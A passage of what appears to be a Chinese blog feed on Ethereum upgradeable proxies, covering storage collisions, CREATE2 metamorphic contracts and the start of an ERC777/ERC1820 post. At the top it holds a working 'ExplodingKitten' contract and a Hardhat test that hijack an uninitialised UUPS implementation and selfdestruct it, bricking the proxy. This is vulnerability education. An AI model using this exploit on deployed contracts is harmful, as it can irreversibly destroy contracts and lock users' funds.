class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.2;<br><br>import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;<br><br>// Fun Fact: An ExplodingKitten can be exploded by another ExplodingKitten<br>contract ExplodingKitten is UUPSUpgradeable &#123;<br>  bytes32 private constant _ROLLBACK_SLOT =<br>    0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143;<br><br>  function explode() public &#123;<br>    StorageSlotUpgradeable.BooleanSlot<br>      storage rollbackTesting = StorageSlotUpgradeable.getBooleanSlot(<br>        _ROLLBACK_SLOT<br>      );<br>    rollbackTesting.value = true;<br>    selfdestruct(payable(msg.sender));<br>  &#125;<br><br>  // Any can call upgrade<br>  function _authorizeUpgrade(address newImplementation) internal override &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ts 测试</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">import</span> &#123; expect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;chai&quot;</span>;<br><span class="hljs-keyword">import</span> &#123; utils &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;ethers&quot;</span>;<br><span class="hljs-keyword">import</span> &#123; ethers, upgrades &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;hardhat&quot;</span>;<br><br><span class="hljs-keyword">const</span> IMPLEMENTATION_SLOT =<br>  <span class="hljs-string">&quot;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&quot;</span>;<br><br><span class="hljs-keyword">const</span> getImplementationAddress = <span class="hljs-keyword">async</span> (proxyAddress: <span class="hljs-built_in">string</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> implementationAddressFromStorage = <span class="hljs-keyword">await</span> ethers.provider.getStorageAt(<br>    proxyAddress,<br>    IMPLEMENTATION_SLOT<br>  );<br>  <span class="hljs-keyword">return</span> utils.getAddress(<br>    utils.hexDataSlice(implementationAddressFromStorage, <span class="hljs-number">32</span> - <span class="hljs-number">20</span>)<br>  );<br>&#125;;<br><br>describe(<span class="hljs-string">&quot;ExplodingKitten&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  it(<span class="hljs-string">&quot;should destroy an UUPS proxy with unguarded logic contract irrecoverably&quot;</span>, <span class="hljs-keyword">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> [deployer, attacker] = <span class="hljs-keyword">await</span> ethers.getSigners();<br>    <span class="hljs-comment">// 以 uups 的可升级模式部署合约，模式选择参见：https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/plugin-truffle/src/deploy-proxy.ts</span><br>    <span class="hljs-keyword">const</span> SimpleToken = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&quot;SimpleToken&quot;</span>);<br>    <span class="hljs-keyword">const</span> simpleToken = <span class="hljs-keyword">await</span> upgrades.deployProxy(SimpleToken, &#123;<br>      <span class="hljs-attr">kind</span>: <span class="hljs-string">&quot;uups&quot;</span>,<br>    &#125;);<br>    <span class="hljs-comment">// 获得逻辑合约地址</span><br>    <span class="hljs-keyword">const</span> implementationAddress = <span class="hljs-keyword">await</span> getImplementationAddress(<br>      simpleToken.address<br>    );<br><br>    <span class="hljs-comment">// Do something on proxy first</span><br>    <span class="hljs-comment">// 铸币</span><br>    <span class="hljs-keyword">await</span> simpleToken.mint(deployer.address, <span class="hljs-number">1000</span>);<br><br>    <span class="hljs-comment">// Verify correct behavior</span><br>    <span class="hljs-comment">// 验证铸币结果</span><br>    expect(<span class="hljs-keyword">await</span> simpleToken.balanceOf(deployer.address)).to.equal(<span class="hljs-number">1000</span>);<br>    expect(<span class="hljs-keyword">await</span> simpleToken.totalSupply()).to.equal(<span class="hljs-number">1000</span>);<br><br>    <span class="hljs-comment">// Verify logic contract is non-zero</span><br>    <span class="hljs-comment">// 验证逻辑合约非零</span><br>    expect(<span class="hljs-keyword">await</span> ethers.provider.getCode(implementationAddress)).to.not.equal(<br>      <span class="hljs-string">&quot;0x&quot;</span><br>    );<br><br>    <span class="hljs-comment">// Begin exploit</span><br>    <span class="hljs-comment">// 开始攻击</span><br>    <span class="hljs-comment">// 部署攻击合约</span><br>    <span class="hljs-keyword">const</span> ExplodingKitten = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&quot;ExplodingKitten&quot;</span>);<br>    <span class="hljs-keyword">const</span> explodingKitten = <span class="hljs-keyword">await</span> ExplodingKitten.connect(attacker).deploy();<br>    <span class="hljs-comment">// 攻击者初始化逻辑合约</span><br>    <span class="hljs-comment">// contract.attach(addressOrName) 会返回附加到新地址的合同的新实例</span><br>    <span class="hljs-comment">// contractFactory.attach(address) 会返回附加到地址的合同实例</span><br>    <span class="hljs-comment">// 参见：https://docs.ethers.io/v5/search/?search=attach</span><br>    <span class="hljs-keyword">await</span> simpleToken<br>      .attach(implementationAddress)<br>      .connect(attacker)<br>      .initialize();<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;implementationAddress&quot;</span>, implementationAddress);<br>    <span class="hljs-comment">// 将逻辑合约升级至自己的攻击合约，并 delegatecall 攻击函数</span><br>    <span class="hljs-keyword">await</span> simpleToken<br>      .attach(implementationAddress)<br>      .connect(attacker)<br>      .upgradeToAndCall(explodingKitten.address, <span class="hljs-string">&quot;0xb8b3dbc6&quot;</span>);<br><br>    <span class="hljs-comment">// Verify logic contract is zero</span><br>    <span class="hljs-comment">// 验证逻辑合约为0</span><br>    expect(<span class="hljs-keyword">await</span> ethers.provider.getCode(implementationAddress)).to.equal(<span class="hljs-string">&quot;0x&quot;</span>);<br><br>    <span class="hljs-comment">// Verify that proxy is no longer functioning</span><br>    <span class="hljs-comment">// 验证代理不再运行</span><br>    <span class="hljs-keyword">await</span> expect(simpleToken.balanceOf(deployer.address)).to.be.reverted;<br>    <span class="hljs-keyword">await</span> expect(simpleToken.totalSupply()).to.be.reverted;<br><br>    <span class="hljs-comment">// Verify that proxy can no longer upgrade</span><br>    <span class="hljs-comment">// 验证代理不能再进行升级</span><br>    <span class="hljs-keyword">const</span> SimpleTokenV2 = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&quot;SimpleTokenV2&quot;</span>);<br>    <span class="hljs-keyword">const</span> simpleTokenV2 = <span class="hljs-keyword">await</span> SimpleTokenV2.deploy();<br>    <span class="hljs-comment">// Tx 不会失败，因为它与现在发送到没有代码的地址相同</span><br>    <span class="hljs-keyword">await</span> simpleToken.upgradeTo(simpleTokenV2.address); <span class="hljs-comment">// Tx not failing as it&#x27;s same as sending to an address without code now</span><br><br>    <span class="hljs-comment">// Verify that the implementation code did not upgrade and is irrecoverable</span><br>    <span class="hljs-comment">// 验证实现代码未升级且不可恢复</span><br>    expect(<span class="hljs-keyword">await</span> getImplementationAddress(simpleToken.address)).to.equal(<br>      implementationAddress<br>    );<br>    <span class="hljs-keyword">await</span> expect(simpleToken.balanceOf(deployer.address)).to.be.reverted;<br>    <span class="hljs-keyword">await</span> expect(simpleToken.totalSupply()).to.be.reverted;<br>  &#125;);<br>&#125;);<br><br></code></pre></td></tr></table></figure><h2 id="存储冲突"><a href="#存储冲突" class="headerlink" title="存储冲突"></a>存储冲突</h2><p>也就是 delegatecall 和 变量声明顺序的问题</p><h3 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h3><p><a href="https://docs.soliditylang.org/en/v0.8.16/internals/layout_in_storage.html">Solidity 状态变量在存储中的布局</a></p><p>转自：</p><ul><li><a href="https://mixbytes.io/blog/storage-upgradable-ethereum-smart-contracts">https://mixbytes.io/blog/storage-upgradable-ethereum-smart-contracts</a></li></ul><h4 id="每个版本单独存储"><a href="#每个版本单独存储" class="headerlink" title="每个版本单独存储"></a>每个版本单独存储</h4><p>第一种方法意味着每个版本分别将其状态存储在自己的存储中。这确保了最大程度的隔离和控制，排除了冲突，但增加了将单独的记录迁移到存储所产生的复杂性和 gas 成本。让我们假设正在开发一个基本的代币合约。在这种情况下，核心数据是余额：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping (address =&gt; uint256) private _balances;<br></code></pre></td></tr></table></figure><p>从新版本直接调用 _balances 是不可能的；为此，必须首先从以前的版本迁移数据。请注意，迁移只能执行一次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping (address =&gt; uint256) private _balances;<br><br>// previous version of a token smart contract<br>ERC20 private _previous;<br><br>// flag indicates that migration of certain user balance was performed<br>mapping (address =&gt; bool) private _migrated;<br><br>function balanceOf(address owner) public view returns (uint256) &#123;<br>    return _migrated[owner] ? _balances[owner] : _previous.balanceOf(owner);<br>&#125;<br><br>function setBalance(address owner, uint256 new_balance) private &#123;<br>    _balances[owner] = new_balance;<br>    if (!_migrated[owner])<br>        _migrated[owner] = true;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/13/upgradeable/image-20221112214123081.png" alt="image-20221112214123081"></p><p>此时会出现其他问题：无法根据任何请求在现场进行迁移，因为可能需要将数据记录到存储中，并且在仅查看功能中不可用。因此，所有对余额的请求，甚至是内部请求，都必须通过 balanceOf 和 setBalance 函数执行。样板代码更高，更不用说增加气体消耗了。</p><p>在最坏的情况下，对仅查看功能的调用会遍历整个令牌版本链收集数据并且无法记录与最新版本相关的操作结果，因为它们没有修改权限。从最新版本以外的其他版本调用这些函数是可能的，但意义不大。</p><p>在最新的令牌代码版本中同时为当前用户迁移数据和记录操作结果需要调用可以改变最新版本状态的函数。因此，对任何其他函数的进一步调用将不会通过整个令牌版本链。只允许代理合约调用改变最新版本状态的函数；对于以前的版本，必须完全拒绝访问这些功能。</p><h4 id="作为数据库的合同"><a href="#作为数据库的合同" class="headerlink" title="作为数据库的合同"></a>作为数据库的合同</h4><p>传统程序是如何解决这个问题的。数据与代码分离！此外，当涉及到复杂的程序和系统时，数据存储在 SQL 或 NoSQL 存储中。</p><p>为此目的编写的临时智能合约可以用作存储。因此，无论当前的代币代码版本如何，数据都将始终保存在该合约的存储中。该合约的代码可以移动到库中，但现在不在议程上。无需将数据从存储迁移到存储；相反，存储访问权限从一个版本转移到另一个版本。然而，使用这种类型的存储并非没有问题。它将需要定义一个可用于任何版本的代币智能合约的接口，例如类似 SQL 的或面向文档的。说到这种存储类型的例子，看看 EOS 表。<em>让我们在数据方案</em></p><p>下统一结构、字段名和数据类型伞。存储智能合约代码可以由静态部分（无论当前数据方案如何都不会改变的代码）和动态部分（方案相关代码）组成。它是包含大量样板代码的动态部分，因此自动生成它很有意义，因为它是在 Protocol Buffers 或 Apache Thrift 中实现的。我碰巧在 ETHBerlin 黑客马拉松上处理了开发<a href="https://github.com/mixbytes/ethereum-cdf">以太坊列式数据存储原型的类似任务。</a></p><p>数据项由以下结构描述：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct Cafe &#123;<br>        string name;<br>        uint32 latitude;<br>        uint32 longitude;<br>        address owner;<br>    &#125;<br></code></pre></td></tr></table></figure><p><a href="https://github.com/mixbytes/ethereum-cdf/blob/master/contracts/CafeIO.sol">..我们为GitHub</a>生成一个“驱动程序” 。<a href="https://github.com/mixbytes/ethereum-cdf/blob/master/contracts/CDF.sol">驱动程序从Github</a>调用静态代码，例如<code>CDF.writeString</code>、<code>CDF.chunkDataPosition</code>和其他函数。</p><p>正如我已经提到的，该<a href="http://ethereum-cdf/">解决方案</a>涵盖了其他问题，并作为外部存储操作的示例。目前，我所知道的以太坊智能合约存储上没有 SQL/NoSQL 存储的有效实现。这似乎是一个有趣的话题，似乎是解决可变智能合约中数据存储问题的有希望的解决方案。</p><p><img src="/2022/11/13/upgradeable/image-20221112214601260.png" alt="image-20221112214601260"></p><p>状态存储在用作 DB 的合约中，并通过调用而不是delegatecall指令调用。对写调用的访问应该受到保护，并且只对代理合约可用。这个数据库合约的公共代码可以移动到一个库中。</p><h4 id="委托调用并将数据存储在代理合约中"><a href="#委托调用并将数据存储在代理合约中" class="headerlink" title="委托调用并将数据存储在代理合约中"></a>委托调用并将数据存储在代理合约中</h4><p>最后，第三种选择是将数据存储在代理合约存储中。如果代理是独立的智能合约，特定代码版本如何访问数据？EVM 委托调用功能使之成为可能。它在目标地址执行代码，但使用执行委托调用指令的合约的存储空间（参见<a href="https://solidity.readthedocs.io/en/v0.5.4/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries">Solidity</a>的更多信息）。</p><p><img src="/2022/11/13/upgradeable/image-20221112214906050.png" alt="image-20221112214906050"></p><p>调用以前合约版本的函数没有什么意义，因为这些只是“代码片段”，所有状态都存储在代理合约中。<em>Delegatecall</em>用于调用库合约。库代码通过指针轻松定位必要的数据。但是，该指令可能对代理合同构成潜在威胁。不幸的是，官方的 Solidity 文档几乎没有用注释警告我们：“如果通过低级委托调用访问状态变量，则两个合约的存储布局必须对齐，以便被调用的合约正确访问调用的存储变量名义上的契约。”</p><h3 id="冲突-1"><a href="#冲突-1" class="headerlink" title="冲突"></a>冲突</h3><p><a href="https://mixbytes.io/blog/collisions-solidity-storage-layouts">参考1</a></p><p><a href="https://medium.com/taipei-ethereum-meetup/solidity-data-collision-51e88f1529a8">参考2</a></p><p>一组简单的问题合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity 0.8.1;<br><br>contract LostStorage &#123;<br>    address public myAddress;<br>    uint public myUint;<br><br>    function setAddress(address _address) public &#123;<br>        myAddress = _address;<br>    &#125;<br><br>    function setMyUint(uint _uint) public &#123;<br>        myUint = _uint;<br>    &#125;<br><br>&#125;<br><br>contract ProxyClash &#123;<br>    address public otherContractAddress;<br><br>    constructor(address _otherContract) &#123;<br>        otherContractAddress = _otherContract;<br>    &#125;<br><br>    function setOtherAddress(address _otherContract) public &#123;<br>        otherContractAddress = _otherContract;<br>    &#125;<br><br>  fallback() external &#123;<br>    address _impl = otherContractAddress;<br><br>    assembly &#123;<br>      let ptr := mload(0x40)<br>      calldatacopy(ptr, 0, calldatasize())<br>      let result := delegatecall(gas(), _impl, ptr, calldatasize(), 0, 0)<br>      let size := returndatasize()<br>      returndatacopy(ptr, 0, size)<br><br>      switch result<br>      case 0 &#123; revert(ptr, size) &#125;<br>      default &#123; return(ptr, size) &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>会发生：</p><ol><li>部署 LostStorage 合约</li><li>部署 Proxy，将 LostStorage 合约地址设置为构造函数参数</li><li>告诉 Remix LostStorage 正在 Proxy 地址上运行</li><li>call <code>myAddress()</code>。它令人惊讶地返回一个非零地址。砰！碰撞。</li></ol><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>代理合约对逻辑合约的调用是使用 delegatecall</p><p>当A合约对B合约执行 delegatecall 时，B合约的函式会被执行，但对 storage 的操作都会作用在A合约上。举例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract A &#123;<br>    uint256 public value;<br><br>    function add(address b, uint256 x, uint256 y) public returns (bool) &#123;<br>        (bool success,) = b.delegatecall(<br>            abi.encodeWithSelector(<br>                bytes4(keccak256(&#x27;add(uint256,uint256)&#x27;)),<br>                x,<br>                y<br>            )<br>        );<br>        return success;<br>    &#125;<br>&#125;<br><br>contract B &#123;<br>    uint256 public value;<br><br>    function add(uint256 x, uint256 y) public returns (uint256) &#123;<br>        value = x + y;<br>        return value;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>other</code>但假若多少在其中加了一个栏位，<code>_value</code>执行合约之后<code>other</code>反而栏位被改了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract A &#123;<br>    uint256 public other;<br>    uint256 public value;<br><br>    function add(address b, uint256 x, uint256 y) public returns (bool) &#123;<br>        (bool success,) = b.delegatecall(<br>            abi.encodeWithSelector(<br>                bytes4(keccak256(&#x27;add(uint256,uint256)&#x27;)),<br>                x,<br>                y<br>            )<br>        );<br>        return success;<br>    &#125;<br>&#125;<br><br>contract B &#123;<br>    uint256 public value;<br><br>    function add(uint256 x, uint256 y) public returns (uint256) &#123;<br>        value = x + y;<br>        return value;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>OpenZeppelin 处理的方法很简单，就是将<code>_implementation</code>换地方摆。以特定字串的杂凑值作为 Slot Index，存储实现的地址。</p><p>当然，<a href="https://docs.soliditylang.org/en/v0.8.14/internals/layout_in_storage.html#mappings-and-dynamic-arrays">当通过 keccak256 计算</a>其存储槽时，任何条目都有可能产生冲突，参阅<a href="https://stackoverflow.com/questions/4014090/is-it-safe-to-ignore-the-possibility-of-sha-collisions-in-practice/4014407#4014407">可能性</a></p><h2 id="CREATE2"><a href="#CREATE2" class="headerlink" title="CREATE2"></a>CREATE2</h2><p>create操作码用于在以太坊区块链上部署合约。合约地址是通过散列部署者的地址和该地址的nonce来生成的。Nonce是一个标量值，等于从部署者的地址发送的交易数量。同样，在合约账户的情况下，nonce是该账户创建合约的数量。nonce有助于保持交易的顺序（来自一个地址的低nonce交易会先被开采），并防止重入攻击。nonce是一个递增的数字，防止create操作码产生重复的地址。只要在当前和下一个nonce之间没有新的交易发生，就有可能通过简单散列下一个nonce和地址来知道下一个合约的地址。</p><p>create2操作码被添加到以太坊虚拟机中，作为君士坦丁堡硬分叉的一部分，这个操作码也被用来部署智能合约。create2使用一些用户控制的输入来推导出智能合约的地址。换句话说，这个操作码提供了一种方法，在将智能合约部署到区块链之前计算其地址。这个操作码不是对部署者的地址和nonce进行散列，而是对部署者的地址、salt（由部署者提供的32字节的字符串）和合约的字节码的哈希进行散列。由于这个操作码的所有参数都由用户控制，create2提供了一种预先确定合约地址的方法。这个方法在推导出优化gas的合约地址和实现像状态通道这样的扩展解决方案时非常有用。在可升级性方面，create2提供了创建可变合约（metamorphic contract）的能力，这些合约可以用新的字节码重新部署到同一地址。</p><p>EVM包含一个selfdestruct 操作码，智能合约可以通过这个操作码来删除。为了在原始地址上部署一个新的字节码，该地址必须是自由的，因为智能合约是不可改变的。有几种方法可以将新的字节码部署到原始地址上，一个低效的方法是找到salt的参数，与新的字节码相结合，生成原始地址，寻找正确的salt参数的计算可以在链下完成。然而，这并不是一个很好的方法。另一个选择是部署一个可变合约。如上所述，可变合约可以使用不同的字节码重新部署到原始地址。</p><p>建立一个良好的升级模式，需要一个可变合约工厂。这个可变合约工厂的目的是通过改变其实现而不改变其地址来促进升级。在部署合约时，对应的部署函数使用create2预先计算可变合约的地址，实现合约是使用传统的create操作码部署的。这个操作码使用地址和nonce来生成地址，并将合约部署到该地址。要求实现地址不能为零。否则，实现合约没有被正确部署，函数必须返回。部署完实现合约后，工厂状态被更新来存储当前的实现合约。</p><p>值得注意的是，实现合约必须是自毁的，这也会使可变合约自毁。在重新部署可变合约之前，要确保可变合约使用selfdestruct操作码进行自我销毁。由于create2操作码的存在，可变合约的地址总是提前知道的。此外，由于它能够改变其实现，可变合约每次都可以用不同的实现重新部署。</p><p>使用create2是有优势的，但它也有自己的风险。最重要的风险是，每次合约被重新部署时，其存储都会被抹去。另外，带有selfdestruct操作码的实现合约可能不是一个可靠的资金存储方式。因此，在采用这种智能合约升级模式之前，开发者必须谨慎行事。</p>]]></content>
    
    
    <summary type="html">包括 EIP1967、透明代理模式、UUPS、Beacon、EIP1167、钻石协议，以及相关漏洞</summary>
    
    
    
    
    <category term="Etherum" scheme="http://example.com/tags/Etherum/"/>
    
    <category term="漏洞" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="EIP" scheme="http://example.com/tags/EIP/"/>
    
  </entry>
  
  <entry>
    <title>ERC777</title>
    <link href="http://example.com/2022/10/31/erc777/"/>
    <id>http://example.com/2022/10/31/erc777/</id>
    <published>2022-10-31T14:10:10.000Z</published>
    <updated>2022-10-31T14:11:57.316Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ERC777"><a href="#ERC777" class="headerlink" title="ERC777"></a>ERC777</h1><p><a href="https://eips.ethereum.org/EIPS/eip-777">ERC777 官方文档</a></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC777">ERC777 合约仓库</a></p><p>由于 ERC20 标准没有一个转账通知机制，并且在转账时无法携带额外的信息，因此出现了 ERC777 来解决这些问题。</p><p>ERC777 在 ERC20 的基础上定义了 <code>send(dest, value, data)</code> 来转移代币， send 函数额外的参数用来携带其他的信息，send 函数会检查持有者和接收者是否实现了相应的钩子函数，如果有实现（不管是普通用户地址还是合约地址都可以实现钩子函数），则调用相应的钩子函数。</p><h2 id="EIP1820"><a href="#EIP1820" class="headerlink" title="EIP1820"></a>EIP1820</h2><p><a href="https://learnblockchain.cn/docs/eips/eip-1820.html#%E7%AE%80%E8%A6%81%E8%AF%B4%E6%98%8E">EIP1820 文档</a></p><p><a href="https://learnblockchain.cn/docs/eips/eip-1820.html">ERC1820</a> 取代了 <a href="https://learnblockchain.cn/docs/eips/eip-820.html">ERC820</a>， <a href="https://learnblockchain.cn/docs/eips/eip-1820.html">ERC1820</a> 修复了 Solidty 0.5 更新带来的与<a href="https://learnblockchain.cn/docs/eips/eip-165.html">ERC165</a>不兼容的问题。这里是官方声明<a href="https://github.com/ethereum/EIPs/issues/820#issuecomment-464109166">erc1820-annoucement</a>，除了这个bug之外，<a href="https://learnblockchain.cn/docs/eips/eip-1820.html">ERC1820</a> 功能上等价于 <a href="https://learnblockchain.cn/docs/eips/eip-820.html">ERC820</a>。</p><p>ERC1820 标准定义了一个通用注册表合约，任何地址（合约或普通用户帐户）都可以注册它支持的接口以及哪个智能合约负责接口实现。</p><p>ERC1820标准定义智能合约和普通用户帐户可以向注册表发布其实现了哪些功能（普通用户帐户通过代理合约实现）</p><p>任何人都可以查询此注册表，询问哪个地址是否实现了给定的接口以及哪个智能合约处理实现逻辑。</p><p>ERC1820注册表合约可以部署在任何链上，并在所有链上的地址是相同的。</p><p>接口的后28个字节都为0的话，会认为是 <a href="https://learnblockchain.cn/docs/eips/eip-165.html">ERC165</a> 接口，并且注册表将转发到合约以查看是否实现了接口。</p><p>此合约还充当 <a href="https://learnblockchain.cn/docs/eips/eip-165.html">ERC165</a> 缓存，以减少 gas 消耗。</p><p>这里介绍 <a href="https://github.com/0xjac/ERC1820/blob/master/contracts/ERC1820Registry.sol">ERC1820 注册表合约</a> 中的两个主要函数</p><p>setInterfaceImplementer 设置某个地址的接口由哪个合约实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @notice 设置某个地址的接口由哪个合约实现，需要由管理员来设置。（每个地址是他自己的管理员，直到设置了一个新的地址）。<br>/// @param _addr 待设置的关联接口的地址（如果&#x27;_addr&#x27;是零地址，则假定为&#x27;msg.sender&#x27;）<br>/// @param _interfaceHash 接口，它是接口名称字符串的 keccak256 哈希值<br>/// 例如: &#x27;web3.utils.keccak256(&quot;ERC777TokensRecipient&quot;)&#x27; 表示 &#x27;ERC777TokensRecipient&#x27; 接口。<br>/// @param _implementer 为地址&#x27;_addr&#x27;实现了 &#x27;_interfaceHash&#x27;接口的合约地址<br>function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external &#123;<br>    address addr = _addr == address(0) ? msg.sender : _addr;<br>    require(getManager(addr) == msg.sender, &quot;Not the manager&quot;);<br><br>    require(!isERC165Interface(_interfaceHash), &quot;Must not be an ERC165 hash&quot;);<br>    if (_implementer != address(0) &amp;&amp; _implementer != msg.sender) &#123;<br>        require(<br>            ERC1820ImplementerInterface(_implementer)<br>                .canImplementInterfaceForAddress(_interfaceHash, addr) == ERC1820_ACCEPT_MAGIC,<br>            &quot;Does not implement the interface&quot;<br>        );<br>    &#125;<br>    interfaces[addr][_interfaceHash] = _implementer;<br>    emit InterfaceImplementerSet(addr, _interfaceHash, 